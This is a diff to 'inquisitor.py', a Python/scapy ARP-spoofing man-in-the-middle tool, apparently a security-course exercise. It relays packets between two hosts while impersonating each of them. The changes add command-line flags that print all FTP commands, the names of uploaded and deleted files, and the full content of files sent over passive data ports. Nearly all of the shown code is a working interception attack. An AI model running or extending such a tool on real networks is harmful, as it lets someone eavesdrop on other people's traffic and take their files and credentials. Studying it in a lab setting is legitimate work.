@@ -5,7 +5,7 @@ import signal
 import uuid
 import socket
 import time
-from scapy.all import ls, sniff, PacketList, Packet, Raw
+from scapy.all import ls, PacketList, Packet, Raw
 from scapy.sendrecv import sendp, sr1, AsyncSniffer
 from scapy.interfaces import get_if_list
 from scapy.layers.l2 import Ether, ARP
@@ -18,6 +18,13 @@ OP_REQUEST=1
 OP_REPLY=2
 FTP_PORT=21
 SNIFFER=None
+FTP_MIN=21000
+FTP_MAX=21010
+FLAGS={
+    "print_all": ["--all", "-a"],
+    "print_content": ["--file-content", "-c"],
+    "print_ftp": ["--all_ftp", "-f"],
+}
 
 class InquisitorException(Exception):
     pass
@@ -59,7 +66,7 @@ def get_my_ip():
     return ipaddress.IPv4Address(IPAddr)
 
 def get_mac_for_ip(ip_src: ipaddress.IPv4Address, mac_src: bytes, ip_dst: ipaddress.IPv4Address) -> str | None:
-    res = sr1(ARP(op=OP_REQUEST, psrc=str(ip_src), pdst=str(ip_dst), hwsrc=mac_src))
+    res = sr1(ARP(op=OP_REQUEST, psrc=str(ip_src), pdst=str(ip_dst), hwsrc=mac_src), verbose=False, timeout=3)
     if isinstance(res, ARP):
         if not ( hasattr(res, "op") and hasattr(res, "psrc") and hasattr(res, "hwdst") and hasattr(res, "pdst") ):
             return None
@@ -72,12 +79,32 @@ def send_arp(ip_src: ipaddress.IPv4Address, mac_src: bytes, ip_dst: ipaddress.IP
     return sendp(a, IFACE, verbose=False)
 
 def main(argv: list[str]):
-    if len(argv) != 5:
-        raise InquisitorException("need 4 arguments")
-    str_ip_src = argv[1]
-    str_ip_target = argv[3]
-    str_mac_src = argv[2]
-    str_mac_target = argv[4]
+    if len(argv) < 5:
+        raise InquisitorException("need 4 arguments at least")
+    verbose = False
+    print_file_content=False
+    str_ip_src = ""
+    str_ip_target = ""
+    str_mac_src = ""
+    str_mac_target = ""
+    for arg in argv[1:]:
+        if arg in FLAGS["print_all"]:
+            verbose = True
+            print_file_content = True
+        elif arg in FLAGS["print_content"]:
+            print_file_content = True
+        elif arg in FLAGS["print_ftp"]:
+            verbose = True
+        elif str_ip_src == "":
+            str_ip_src = arg
+        elif str_mac_src == "":
+            str_mac_src = arg
+        elif str_ip_target == "":
+            str_ip_target = arg
+        elif str_mac_target == "":
+            str_mac_target = arg
+        else:
+            raise InquisitorException(f"{arg} not a param or a flag")
     ip_src = get_ip(str_ip_src)
     mac_src = get_mac(str_mac_src)
     ip_target = get_ip(str_ip_target)
@@ -100,6 +127,7 @@ def main(argv: list[str]):
     if test_mac != str_mac_target:
         raise InquisitorException(f"Parameter error : {ip_target} not corresponding to {str_mac_target}, it is {test_mac}")
 
+    last_file = ""
     ips = {str_ip_src: str_mac_src, str_ip_target: str_mac_target}
     SNIFFER = AsyncSniffer(iface=IFACE, lfilter=lambda x: (x.haslayer(Ether) and x.haslayer(IP) and get_mac(x[Ether].dst) == my_mac_addr and x[IP].src in ips.keys() and x[IP].dst in ips.keys()))
     SNIFFER.start()
@@ -115,15 +143,29 @@ def main(argv: list[str]):
                 # print(p)
                 # p.show()
                 if Raw in p and FTP_PORT in [p[TCP].sport, p[TCP].dport]:
-                    print(f"{p[IP].src} -> {p[IP].dst} : {p[Raw].load.decode()}")
+                    cmd = p[Raw].load.decode()
+                    if verbose:
+                        print(f"{p[IP].src} -> {p[IP].dst} : {cmd}")
+                    if cmd.startswith("STOR"):
+                        last_file = cmd[5:-2]
+                        print(f"{p[IP].src} -> {p[IP].dst} : '{last_file}' file transfert")
+                    if cmd.startswith("DELE"):
+                        last_file = cmd[5:-2]
+                        print(f"{p[IP].src} -> {p[IP].dst} : '{last_file}' file deleted")
+                if print_file_content and Raw in p and (FTP_MIN <= p[TCP].sport <= FTP_MAX or FTP_MIN <= p[TCP].dport <= FTP_MAX):
+                    file_content = p[Raw].load.decode()
+                    print(f"{p[IP].src} -> {p[IP].dst} : FILE_CONTENT of {last_file} : {file_content}")
                 p[Ether].src = my_mac_addr
                 p[Ether].dst = ips[p[IP].dst]
                 sendp(p, IFACE, verbose=False)
 
 
 def usage():
-    print("""
+    print(f"""
 python3 inquisitor.py <IP-src> <MAC-src> <IP-target> <SRC-target>
+{",".join(FLAGS['print_all'])}          print content of files transfered and all ftp trafic
+{",".join(FLAGS['print_content'])} print content of files transfered
+{",".join(FLAGS['print_ftp'])}      print all ftp trafic
 """)
 
 def signal_handler(signum, frame):
